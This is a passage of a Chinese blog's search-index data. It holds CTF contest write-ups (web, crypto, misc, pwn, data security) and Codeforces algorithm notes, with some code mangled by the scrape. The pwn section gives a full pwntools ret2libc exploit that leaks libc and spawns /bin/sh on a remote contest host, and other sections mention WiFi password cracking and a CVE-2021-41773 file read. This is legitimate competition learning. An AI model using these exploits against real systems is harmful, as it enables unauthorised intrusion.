0; i \u003c m; i++)7 {8 tmp[queries[i][0]][queries[i][1]]++;9 tmp[queries[i][0]][queries[i][3]+1]–;10 tmp[queries[i][2]+1][queries[i][1]]–;11 tmp[queries[i][2]+1][queries[i][3]+1]++;12 }//对差分数组进行操作13 vector\u003cvector\u003e ans(n , vector(n , 0));14 ans[0][0] = tmp[0][0];15 for(int i = 0; i \u003c n; ++i)16 for(int j = 1; j \u003c n; ++j) tmp[i][j] += tmp[i][j-1];17 for(int i = 1; i \u003c n; ++i)18 for(int j = 0; j \u003c n; ++j) tmp[i][j] += tmp[i-1][j];19 for(int i = 0; i \u003c n; ++i)20 for(int j = 0; j \u003c n; ++j) ans[i][j] = tmp[i][j];21 //由于下标从0开始，所以分布求前缀和要方便一点22 //这种写法不存在重复加的地方，第一个for求一维前缀和，第二个for加上前面行的和。23 return ans;24 }25}; c++\r题目提示是CVE-2021-41773漏洞，搜索漏洞利用方法直接文件读取 ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:3","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF5\r访问网站提示ip不对，需要访问ip为1.1.1.1，使用bp抓包修改X-Forworded-For为1.1.1.1在返回信息中就可以找到flag ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:4","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"Crypto\r","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:2:0","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"simple\r文件名为放射，谐音仿射密码，同时密文类似flag格式，仿射密码恰好只对字母进行加密。 from Crypto.Util.number import inverse flag = ''.join(i if i not in \"qwertyuiopasdfghjklzxcvbnm\" else chr(((ord(i)-ord('a') - 321564))*inverse(123456,13)%13+ord('a')) for i in 'kgws{m8u8cm65-ue9k-44k5-8361-we225m76eeww}') print(flag)","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:2:1","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"b64\r题目给了一个密文，和一组对应的明文密文，因此肯定是先通过已知对应明密文破解出加密算法，再利用加密算法和密文得到flag。根据题目名称b64，将给定明文加密一下看，发现指定位置变换相同，所以本题应该是一个单表代换再加一个base64解密。大致得到对应表如上，但是很糟糕的是，明密文变换没有直接的对应关系，这里应该是随机映射。所以我们需要进行暴力破解。 统计一下已知的字母变换对，发现有22个字符还不知道。而未知的9个位置中，有6种不同字符。爆破6种字符的选择，再根据flag格式flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}以及内容均为09af来验证是否可能为正确答案。大致代码如下： # -*- coding: utf-8-*- from base64 import * from string import * def check(s): for i in s: if i not in \"flag{-1234567890abcdef}\": return False return True flag = 'uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz' a='pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=' b='YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM=' alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789abcdefABCDEF+/' FLAG='' print(\"fail words\") for i in flag: if i in a: index = a.index(i) FLAG+=b[index] else: FLAG+='!' print i, print \"\\nFLAG cipher\" print FLAG #'ZmxhZ3sxZTNhMm!lN!0xYz!yLT!mNGYtOWIyZ!!hNGFmYW!kZj!xZTZ!' print \"alternative words\" aw=\"\" for i in alpha: if i not in b: aw += i print aw '@#$%^\u0026' table = 'ACHJKPRVefnuvw156789efAC+/' print(\"for z\") for i in table: if b64decode(\"ZTZ\"+i)[-1] == '}': FLAG = FLAG.replace(\"ZTZ!\",\"ZTZ9\") table = table.replace(i,\"\") #print FLAG print(\"for G\") for i in table: if check(b64decode(\"Zj\"+i+\"x\")) and check(b64decode(\"Yz\"+i+\"y\")): #print b64decode(\"Zj\"+i+\"x\") FLAG = FLAG.replace(\"Zj!x\",\"Zj\"+i+\"x\").replace(\"Yz!y\",\"Yz\"+i+\"y\") table = table.replace(i,\"\") #print i #print FLAG print(\"for I and s\") for i in table: for j in table: if check(b64decode(\"N\"+i+\"0x\")) and check(b64decode(\"Z\"+i+j+\"h\")): #print b64decode(\"N\"+i+\"0x\"),b64decode(\"Z\"+i+j+\"h\") FLAG = FLAG.replace(\"N!0x\",\"N\"+i+\"0x\").replace(\"Z!!h\",\"Z\"+i+j+\"h\") table = table.replace(i,\"\").replace(j,\"\") #print i,j #print FLAG print(\"for X and E\") for i in table: for j in table: if j == i: continue s = b64decode(FLAG.replace(\"Mm!l\",\"Mm\"+i+\"l\").replace(\"LT!m\",\"LT\"+i+\"m\").replace(\"YW!k\",\"YW\"+j+'k')) if check(s): print s枚举得到的flag ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:2:2","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Writeup\r网络安全\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:0:0","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"MISC\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:0","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"wifi密码\r根据题目提示，使用crunch指令生成字典。 使用aircrack-ng工具结合自定义字典进行密码爆破得到flag{power456} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:1","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"5GC网元AMF名称\r根据题目提示猜测有一个包里面的字段为AMFName，直接搜索，得到密文。 解密得到flag:flag{amfname-ujrr1123} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:2","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"Tunnel\r按协议类型排序，将所有ICMP协议包中的请求包的数据长度转为ASCII字符即得到flag。 flag{iCmp_1s_tO0_Ea5y} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:3","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"ezdmp\r取证工具发现有一个result.txt文件，将其读取出来。 发现Password对应的值形似flag，盲猜就是提交发现确实是flag flag{ROck_4nd_Sh4N9H41} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:4","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"PWN\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:2:0","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"推箱子\r运行程序，发现是简单的推箱子游戏，和题目描述一致。使用ida打开文件，能够发现明显的栈溢出漏洞。 read函数存在栈溢出漏洞。分析程序可知，v6的值随着角色每次移动都会增大，所以只需要先让角色移动一定长度后再通过游戏即可让v6的大小大于栈长度，实现栈溢出。 payload = 0x570 * b'da' + b'ddwwwwssdwwssassdwwwsssdww'xxxxxxxxxx void print(ll n){ ll d = n / 4; if(n % 4 == 0){ cout « d « ’ ’ « d « ’ ’ « d * 2 « ‘\\n’; }else if(n % 4 == 1){ cout « 1 « ’ ’ « (n - 1) / 2 « ’ ’ « (n - 1) / 2 « ‘\\n’; }else if(n % 4 == 2){ cout « 2 « ’ ’ « (n - 2) / 2 « ’ ’ « (n - 2) / 2 « ‘\\n’; }else{ cout « 1 « ’ ’ « (n - 1) / 2 « ’ ’ « (n - 1) / 2 « ‘\\n’; }}void solve(){ ll n, k; cin » n » k; if(k == 3){ print(n); }else{ for(int i = 1; i \u003c= k - 3; i++) cout « 1 « ’ ‘; n -= k - 3; print(n); }}c++ from pwn import * context(os='linux',arch='amd64',log_level = 'debug') def get_addr(): return u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) p = remote(\"222.67.132.186\",23267) elf = ELF('./game') _libc = ELF('./libc.so.6') pop_rdi_addr = 0x400cf3 ret_addr = 0x400576 main_addr = 0x4006D7 _p_libc_system = _libc.symbols['system'] _p_libc_binsh = _libc.search(b'/bin/sh').__next__() _p_libc_puts = _libc.symbols['puts'] puts_plt = elf.plt['puts'] #puts函数的入口地址 puts_got = elf.got['puts'] #puts函数的got表地址 payload = 0x570 * b'da' + b'ddwwwwssdwwssassdwwwsssdww' p.sendline(payload) payload2 = 0x570 * b'A' + 0x8 * b'A' + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) p.sendlineafter( b'Grandmaster, Please leave your name:',payload2) real_puts_addr = get_addr() print(hex(real_puts_addr)) libc_base = real_puts_addr - _p_libc_puts p_system = libc_base + _p_libc_system p_binsh = libc_base + _p_libc_binsh p.sendline(payload) payload3 = 0x570 * b'A' + 0x8 * b'A' + p64(ret_addr) + p64(pop_rdi_addr) + p64(p_binsh) + p64(p_system) p.sendlineafter( b'Grandmaster, Please leave your name:',payload3) p.interactive()数据安全\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:2:1","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"口令画像分析一 \u0026 二\r按照题目约束条件，编写程序分析即可。 得到题目一答案为5014,4954,5052,4980 得到题目二答案为129， 用MD532位小写加密即为答案。 flag{711314c61e9b9172a6688573498c8321} flag{d1f491a404d6854880943e5c3cd9ca25} package main import ( \"fmt\" \"github.com/360EntSecGroup-Skylar/excelize\" ) func main() { // 打开 Excel 文件 f, err := excelize.OpenFile(\"./user.xlsx\") if err != nil { fmt.Println(err) return } // 读取 Sheet1 中 A1 单元格的值 // from C2 to C20001 cnt1 := 0 cnt2 := 0 cnt3 := 0 cnt4 := 0 cnt5 := 0 for i := 2; i \u003c= 20001; i++ { s := fmt.Sprintf(\"C%d\", i) s1 := fmt.Sprintf(\"D%d\", i) cellValue := f.GetCellValue(\"Sheet1\", s) id := f.GetCellValue(\"Sheet1\", s1) //fmt.Println(cellValue) if err != nil { fmt.Println(err) return } // 输出单元格值 flag := 0 for j := 0; j \u003c len(cellValue); j++ { if cellValue[j] \u003e= '0' \u0026\u0026 cellValue[j] \u003c= '9' { flag |= 1 } else if cellValue[j] \u003e= 'a' \u0026\u0026 cellValue[j] \u003c= 'z' { flag |= 2 } else if cellValue[j] \u003e= 'A' \u0026\u0026 cellValue[j] \u003c= 'Z' { flag |= 4 } else { flag |= 8 } } if flag == 1 || flag == 2 { cnt1++ } else if flag == 3 { cnt2++ } else if flag == 7 { //fmt.Println(cellValue) cnt3++ } else if flag == 15 { //fmt.Println(cellValue) cnt4++ year := 0 sex := 0 if id[16] == 'X' { sex = 1 } else { if (id[16]-'0')%2 == 0 { sex = 1 } } for j := 6; j \u003c= 9; j++ { year = year*10 + (int)(id[j]-'0') } //month := 0 day := (id[12]-'0')*10 + (id[13] - '0') month := (id[10]-'0')*10 + (id[11] - '0') if day \u003e 31 { fmt.Println(day) } if year == 2002 \u0026\u0026 sex == 1 { if month == 5 \u0026\u0026 day \u003e= 21 { cnt5++ } if month == 6 \u0026\u0026 day \u003c= 21 { cnt5++ } } } } fmt.Println(cnt1) fmt.Println(cnt2) fmt.Println(cnt3) fmt.Println(cnt4) fmt.Println(cnt1 + cnt2 + cnt3 + cnt4) fmt.Println(cnt5) }","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:2:2","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["算法和数据结构"],"content":"Problem - 1339B - Codeforces\r将数组排序后，从中间元素开始，左右依次插入即可，可以保证绝对值差距越来越大。 #include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; void solve(){ int n; scanf(\"%d\", \u0026n); vector\u003cint\u003e f(n); for(int i = 0; i \u003c n; i++) scanf(\"%d\", \u0026f[i]); sort(f.begin(), f.end()); int l = (n - 1)/2, r = l + 1; for(int i = 0; i \u003c n; i++){ if(i % 2 == 0){ cout \u003c\u003c f[l] \u003c\u003c ' '; l--; } else{ cout \u003c\u003c f[r] \u003c\u003c ' '; r++; } } cout \u003c\u003c '\\n'; } int main() { int t; scanf(\"%d\", \u0026t); while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"1352G 构造排列\r","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题意\r构造序列，满足相邻数之间的绝对值差X满足2 \u003c= x \u003c= 4 ","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:1","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题解\r分奇偶 void solve(){ int n; cin \u003e\u003e n; if(n \u003c 4){ cout \u003c\u003c -1 \u003c\u003c '\\n'; return; } vector\u003cint\u003e f; for(int i = (n % 2 == 0? 2:1); i \u003c= n; i += 2) f.push_back(i); int mx = f[f.size() - 1]; if(mx \u003e 3){ f.push_back(mx - 3); f.push_back(mx - 1); for(int i = mx - 5; i \u003e 0; i -= 2) f.push_back(i); } if(f.size() == n){ for(auto i : f) cout \u003c\u003c i \u003c\u003c ' '; cout \u003c\u003c '\\n'; }else{ cout \u003c\u003c -1 \u003c\u003c '\\n'; } }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:2","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"1353D 优先队列维护区间\r","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题意\r给你一个全为0的数组 要求把 1 到 n 插入，插入规则为：第i次选择一个左边最长的全0区间，将区间 (l+r)/2的位置变为 i. ","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:1","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题解\r模拟插入过程，将区间信息用优先队列维护和自定义排序即可，堆存[l,r]，表示 